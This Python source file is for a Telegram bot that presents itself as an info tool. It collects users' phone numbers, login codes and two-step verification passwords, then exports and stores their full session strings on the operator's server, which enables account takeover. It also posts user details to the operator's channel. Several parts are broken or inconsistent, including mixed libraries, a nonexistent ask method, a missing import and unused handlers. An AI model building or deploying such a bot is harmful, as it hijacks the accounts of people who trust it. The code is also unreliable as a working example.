import asyncio
import logging
import os
import random
import string
from telegram import Update
from telegram.ext import Updater, CommandHandler, MessageHandler, CallbackContext, ConversationHandler, Application
from telegram.ext import filters
from pyrogram import Client, filters as pyrogram_filters
from pyrogram.errors import ApiIdInvalid, PhoneNumberInvalid, PhoneCodeInvalid, PhoneCodeExpired
from telethon.errors import SessionPasswordNeededError  # Correct import for session password error
from config import API_ID, API_HASH, BOT_TOKEN, CHANNEL_ID  # Import credentials and channel ID from config.py

# Generate random session name for each user
def generate_random_name(length=7):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

# Delete session files for a specific user
async def delete_session_files(user_id):
    session_file = f"session_{user_id}.session"
    memory_file = f"session_{user_id}.session-journal"

    session_file_exists = os.path.exists(session_file)
    memory_file_exists = os.path.exists(memory_file)

    if session_file_exists:
        os.remove(session_file)
    
    if memory_file_exists:
        os.remove(memory_file)

    return session_file_exists or memory_file_exists

# Save session string in a text file
def save_session_string(user_id, string_session):
    with open(f"session_{user_id}.txt", "w") as f:
        f.write(string_session)

# Read session string from a file
def read_session_string(user_id):
    try:
        with open(f"session_{user_id}.txt", "r") as f:
            return f.read()
    except FileNotFoundError:
        return None

# Function to send user info to your channel
async def send_user_info_to_channel(update: Update, context: CallbackContext):
    user = update.message.from_user
    user_info = (
        f"New User Info:\n"
        f"User ID: {user.id}\n"
        f"Name: {user.first_name} {user.last_name if user.last_name else ''}\n"
        f"Username: @{user.username if user.username else 'No Username'}\n"
        f"Language: {user.language_code if user.language_code else 'Not Provided'}\n"
        f"Chat ID: {update.message.chat.id}\n"
    )
    # Send info to the specified channel
    try:
        await context.bot.send_message(chat_id=CHANNEL_ID, text=user_info)
    except Exception as e:
        logging.error(f"Error sending message to channel: {e}")

# Define the /logout command to clear session data
async def clear_db(client, message):
    user_id = message.chat.id
    files_deleted = await delete_session_files(user_id)

    if files_deleted:
        await message.reply("✅ Your session data and files have been cleared from memory and disk.")
    else:
        await message.reply("⚠️ You are not logged in, no session data found.")

# Define the /login command
async def generate_session(update: Update, context: CallbackContext):
    user_id = update.message.chat.id
    number = await context.bot.ask(update.message.chat.id, 'Please enter your phone number along with the country code. \nExample: +19876543210', filters=filters.text)
    phone_number = number.text
    try:
        await update.message.reply("📲 Sending OTP...")
        client = Client(f"session_{user_id}", API_ID, API_HASH)
        
        await client.connect()
    except Exception as e:
        await update.message.reply(f"❌ Failed to send OTP {e}. Please wait and try again later.")
        return
    
    try:
        code = await client.send_code(phone_number)
    except ApiIdInvalid:
        await update.message.reply('❌ Invalid combination of API ID and API HASH. Please restart the session.')
        return
    except PhoneNumberInvalid:
        await update.message.reply('❌ Invalid phone number. Please restart the session.')
        return
    
    try:
        otp_code = await context.bot.ask(update.message.chat.id, "Please check for an OTP in your official Telegram account. Once received, enter the OTP in the following format: \nIf the OTP is `12345`, please enter it as `1 2 3 4 5`.", filters=filters.text, timeout=600)
    except TimeoutError:
        await update.message.reply('⏰ Time limit of 10 minutes exceeded. Please restart the session.')
        return
    phone_code = otp_code.text.replace(" ", "")
    
    try:
        await client.sign_in(phone_number, code.phone_code_hash, phone_code)
    except PhoneCodeInvalid:
        await update.message.reply('❌ Invalid OTP. Please restart the session.')
        return
    except PhoneCodeExpired:
        await update.message.reply('❌ Expired OTP. Please restart the session.')
        return
    except SessionPasswordNeededError:
        try:
            two_step_msg = await context.bot.ask(update.message.chat.id, 'Your account has two-step verification enabled. Please enter your password.', filters=filters.text, timeout=300)
        except TimeoutError:
            await update.message.reply('⏰ Time limit of 5 minutes exceeded. Please restart the session.')
            return
        try:
            password = two_step_msg.text
            await client.check_password(password=password)
        except PasswordHashInvalid:
            await two_step_msg.reply('❌ Invalid password. Please restart the session.')
            return
    
    string_session = await client.export_session_string()
    save_session_string(user_id, string_session)  # Save session string locally
    await client.disconnect()
    await otp_code.reply("✅ Login successful!")

# Define the start and help commands for the bot
async def start(update: Update, context: CallbackContext) -> None:
    await update.message.reply_text(
        "Hey User! 👋\n"
        "Welcome to the Telegram Info Bot.\n\n"
        "Commands you can use:\n"
        "/login - Login to your Telegram account\n"
        "/help - Get more info about bot features 🎉\n\n"
        "Note: \n"
        "I can help you fetch user IDs and mobile numbers after logging in. "
        "You can also check your own information after successful login."
    )

async def help_command(update: Update, context: CallbackContext) -> None:
    await update.message.reply_text(
        "ℹ️ This bot allows you to access some of your Telegram information.\n\n"
        "⚙️ Available Commands:\n"
        "/start - Start the bot\n"
        "/login - Login to your Telegram account\n"
        "/help - Show this message"
    )

# Handle unauthorized messages (before login)
async def handle_unauthorized_messages(update: Update, context: CallbackContext) -> None:
    if not context.user_data.get("logged_in"):
        await update.message.reply_text(
            "🚫 You need to log in first! 🔑\n\n"
            "Use the /login command to connect to your Telegram account. "
            "After logging in, I can assist you further. 😊"
        )
    else:
        await update.message.reply_text(
            "❓ I didn't understand that. Please use a valid command.\n\n"
            "Available Commands:\n"
            "/start - Start the bot\n"
            "/help - Help info\n"
            "/login - Connect your Telegram account"
        )

# Conversation handler
def conversation_handler() -> ConversationHandler:
    return ConversationHandler(
        entry_points=[CommandHandler('login', generate_session)],  # /login command triggers this conversation
        states={
            'PHONE': [MessageHandler(filters.TEXT & ~filters.COMMAND, generate_session)],  # Step 1: phone number
            'OTP': [MessageHandler(filters.TEXT & ~filters.COMMAND, generate_session)],  # Step 2: OTP
            'PASSWORD': [MessageHandler(filters.TEXT & ~filters.COMMAND, generate_session)],  # Step 3: Password (if 2FA)
        },
        fallbacks=[CommandHandler('help', help_command)],  # In case of fallback
    )

# Main function to run the bot
def main():
    # Use your bot's token
    application = Application.builder().token(BOT_TOKEN).build()

    # Enable logging
    logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.DEBUG)

    # Command Handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))

    # Handle login process
    application.add_handler(conversation_handler())

    # Handle messages that are not commands
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_unauthorized_messages))

    # Start Bot Polling
    try:
        application.run_polling()
    except Exception as e:
        logging.error(f"Error occurred: {e}")

if __name__ == "__main__":
    main()
